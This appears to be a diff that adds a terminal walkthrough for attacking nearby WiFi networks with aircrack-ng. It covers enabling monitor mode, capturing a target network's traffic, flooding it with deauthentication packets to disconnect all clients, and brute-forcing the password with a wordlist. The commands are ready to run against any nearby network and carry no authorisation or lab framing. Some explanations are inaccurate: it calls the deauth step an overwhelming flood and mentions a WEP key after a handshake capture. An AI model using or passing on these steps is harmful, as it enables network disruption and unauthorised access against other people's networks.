@@ -1,0 +1,45 @@
+To be performed inside a terminal.
+Commands are written with the prefix $
+Comments are written with the prefix #
+Additional Steps are not necessary and can be done at the end.
+
+~Install the tool~
+$ sudo apt-get install aircrack-ng
+
+~Setting the WiFi card into Monitor mode~
+$ sudo ifconfig wlan0 down  #check the name of your wifi card by typing 'ifconfig'
+$ sudo iwconfig wlan0 mode monitor
+$ sudo ifconfig wlan0 up
+
+$ sudo airmon-ng check kill   #kill the network manager before proceeding.
+$ sudo airmon-ng start wlan0 
+$ sudo airodump-ng wlan0    #starts checking the networks nearby by collecting their packets. DoS will be performed on one of the below networks.
+
+~~Additional Step 1: This step is necessary for brute-forcing the password of the network~~
+$ sudo airodump-ng --bssid 3C:95:09:82:77:F1 --channel 11 --write ~/path/to/your/file/RandomAvailableWifiNetwork wlan0
+  #breaking down the command
+  #Bssid is the MAC address of the Router of RandomAvailableWifiNetwork. Note the bssid of the target network interface.
+  #Channel is where all the access points of the network can be deployed on. Note the channel running the target network interface.
+  #w tag is used to store all the packet captures with the desired file name RandomAvailableWifiNetwork.
+  #wlan0 being the wifi card interface.
+  
+~Performing the DDoS~
+$ sudo aireplay-ng --deauth 1000 -a 3C:95:09:82:77:F1 wlan0
+  #breaking down the command
+  #Deauth tag sends a specified number of deauth packets(here 1000) which tells the client "Please disconnect from me, reconnect and reauthenticate."
+  #a tag is for the specifying the bssid of the target network interface.
+  #On running this command, the network gets overwhelmed by the huge number of distributed packets it is receiving. 
+  #Thus all the connected devices are disconnected from the network.
+
+~~Additional Step 2: In this step, cracking the password by brute-forcing is done~~
+$ sudo aircrack-ng -b 3C:95:09:82:77:F1 -w /usr/share/wordlists/rockyou.txt ~/path/to/your/file/RandomAvailableWifiNetwork.cap
+  #Note: It takes a vast amount of time to brute force because of the varying security methods, strength of password and lack of a proper pass-wordlist.
+  #If the password is weak, Aircrack-ng will recover the WEP key from the RandomAvailableWifiNetwork.cap capture file.
+
+~Necessary steps to connect back to the WiFi~
+$ sudo ifconfig wlan0 down
+$ sudo iwconfig wlan0 mode managed
+$ sudo ifconfig wlan0 up
+$ service network-manager restart
+#or
+$ systemctl restart NetworkManager
